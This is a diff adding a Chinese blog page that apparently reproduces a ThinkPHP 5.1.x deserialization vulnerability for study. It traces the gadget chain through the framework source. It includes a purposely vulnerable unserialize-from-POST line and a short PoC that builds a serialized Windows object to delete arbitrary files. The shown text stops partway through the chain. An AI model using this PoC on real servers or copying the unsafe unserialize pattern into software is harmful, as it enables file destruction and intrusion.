@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言漏洞复现练习,能力有限,只能先直接跟着其他师傅的文章思路一步一步复现. 环境搭建1composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ 1composer create-project topthink/think=5.1.* tp5.1 PHP版本:7.3 Thinkphp版本:5.1.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Thinkphp 5.1.x 反序列化漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2020/02/06/tp5.1反序列化/index.html">
+<meta property="og:site_name" content="R1dd1er&#39;s blogs">
+<meta property="og:description" content="前言漏洞复现练习,能力有限,只能先直接跟着其他师傅的文章思路一步一步复现. 环境搭建1composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ 1composer create-project topthink/think=5.1.* tp5.1 PHP版本:7.3 Thinkphp版本:5.1.">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/00643K3ogy1gblqgqbtmvj31040pmdn8.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/00643K3ogy1gblrmuv24pj31040gl459.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/00643K3ogy1gblsqaplnpj313h0omgux.jpg">
+<meta property="og:updated_time" content="2020-02-06T13:38:12.782Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Thinkphp 5.1.x 反序列化漏洞复现">
+<meta name="twitter:description" content="前言漏洞复现练习,能力有限,只能先直接跟着其他师傅的文章思路一步一步复现. 环境搭建1composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ 1composer create-project topthink/think=5.1.* tp5.1 PHP版本:7.3 Thinkphp版本:5.1.">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/00643K3ogy1gblqgqbtmvj31040pmdn8.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'R1dd1er'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/06/tp5.1反序列化/">
+
+
+
+
+
+  <title>Thinkphp 5.1.x 反序列化漏洞复现 | R1dd1er's blogs</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R1dd1er's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">积跬步，至千里</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/06/tp5.1反序列化/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R1dd1er">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R1dd1er's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Thinkphp 5.1.x 反序列化漏洞复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-06T21:35:54+08:00">
+                2020-02-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>漏洞复现练习,能力有限,只能先直接跟着其他师傅的文章思路一步一步复现.</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.1.* tp5.1</span><br></pre></td></tr></table></figure>
+<p>PHP版本:7.3</p>
+<p>Thinkphp版本:5.1.39</p>
+<p>在Index.php文件中添加触发反序列化的代码,以供待会的poc测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// [ 应用入口文件 ]</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载基础文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/../thinkphp/base.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持事先使用静态方法设置Request对象和Config对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行应用并响应</span></span><br><span class="line">Container::get(<span class="string">'app'</span>)-&gt;run()-&gt;send();</span><br><span class="line">$str = base64_decode($_POST[<span class="string">'key'</span>]);</span><br><span class="line">unserialize($str);</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>反序列化的入口都是魔术方法开始的,全局搜索<code>__destruct</code>函数,定位到<code>/thinkphp/library/think/process/pipes/Windows.php</code>的<code>__destruct</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进<code>removeFiles()</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 删除临时文件</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">            @unlink($filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注释说的很明确,是一个删除临时文件的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> array */</span></span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很明显<code>$files</code>是可控的,所以存在任意文件删除的漏洞,参考poc如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;files=[<span class="string">'需要删除文件的路径'</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure>
+<p>继续跟进<code>removeFiles()</code>的<code>file_exists</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_exists</span> <span class="params">($filename)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Tells whether the filename is writable</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://php.net/manual/en/function.is-writable.php</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $filename &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The filename being checked.</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool true if the filename exists and is</span></span><br><span class="line"><span class="comment"> * writable.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 4.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 5.0</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+<p>根据文档的注释说明,<code>$filename</code>是会被当成字符串进行处理的</p>
+<p>而我们又知道,魔术方法<code>__toString</code>函数是在一个对象被当成字符串使用时触发,也就是说,只要我们将一个类赋值给<code>$filename</code>,就会触发这个类的<code>__toString</code>方法,接下来要寻找可用的<code>__toString</code> 方法,全局搜索后,定位到<code>\thinkphp\library\think\model\concern\Conversion.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们跟进<code>toJson()</code>看看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 转换当前模型对象为JSON字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  integer $options json参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>嗯,注释已经很清晰的说明了该函数的功能,继续跟进<code>toArray()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">trait</span> Conversion</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 转换当前模型对象为数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $item       = [];</span><br><span class="line">        $hasVisible = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">       ....</span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> $key =&gt; $name) &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    $relation = <span class="keyword">$this</span>-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!$relation) &#123;</span><br><span class="line">                        $relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                        <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">                            $relation-&gt;visible($name);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    .....</span><br><span class="line">        <span class="keyword">return</span> $item;</span><br><span class="line">    &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+<p>我们需要在<code>toArray()</code>函数中寻找一个满足<code>$可控变量-&gt;方法(参数可控)</code>的点，首先，这里调用了一个<code>getRelation</code>方法。我们跟进<code>getRelation()</code>，它位于<code>Attribute</code>类中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取当前模型的关联模型数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $name 关联方法名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于<code>getRelation()</code>下面的<code>if</code>语句为<code>if (!$relation)</code>，返回空就进入<code>$relation = $this-&gt;getAttr($key)</code>,继续跟进<code>getAttr()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取器 获取数据对象的值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $name 名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  array  $item 数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $notFound = <span class="keyword">false</span>;</span><br><span class="line">            $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">            $notFound = <span class="keyword">true</span>;</span><br><span class="line">            $value    = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析后可确定只要<code>$notFound</code>为false就不会走到下面的代码,所以均可忽略</p>
+<p>继续跟进<code>getData()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">InvalidArgumentException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Expression</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Exception</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Loader</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取对象原始数据 如果不存在指定字段返回false</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $name 字段名 留空获取全部</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'property not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $name);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>需要注意的一点是这里类的定义使用的是<code>Trait</code>而不是<code>class</code>。自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 <code>trait</code>。通过在类中使用<code>use</code> 关键字，声明要组合的Trait名称。所以，这里类的继承要使用<code>use</code>关键字。</p>
+</blockquote>
+<p>借用七月火师傅的分析流程图,这样看会更清晰</p>
+<p><img src="http://ww1.sinaimg.cn/large/00643K3ogy1gblqgqbtmvj31040pmdn8.jpg" alt="20191002211000-f0846e4a-e515-1.png"></p>
+<blockquote>
+<p><strong>$relation</strong> 变量来自 <strong>$this-&gt;data[$name]</strong> ，而这个变量是可以控制的。<strong>第192行</strong> 的 <strong>$name</strong> 变量来自 <strong>$this-&gt;append</strong> ，也是可以控制的。所以 <strong>$relation-&gt;visible($name)</strong> 就变成了：<strong>可控类-&gt;visible(可控变量)</strong> 。那么接下来，就要找可利用的 <strong>visible</strong> 方法，或者没有 <strong>visible</strong> 方法，但有可利用的 <strong>__call</strong> 方法。</p>
+</blockquote>
+<p>经过查找分析,并没有可利用的<code>visible()</code>方法,所以需要寻找可利用的<code>__call</code>方法,且这个方法的类不存在<code>visible()</code>方法</p>
+<p>接下来,需要找到一个同时继承了<code>Attribute</code>类和<code>Conversion</code>类的子类。全局搜索<code>use model\concern\Attribute</code>,在<code>\thinkphp\library\think\Model.php</code>找到了这样的类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> \<span class="title">JsonSerializable</span>, \<span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>确定利用链需要控制的变量</p>
+<p><code>Windows</code>类的<code>$files</code></p>
+<p><code>Conversion</code>类的<code>$append</code></p>
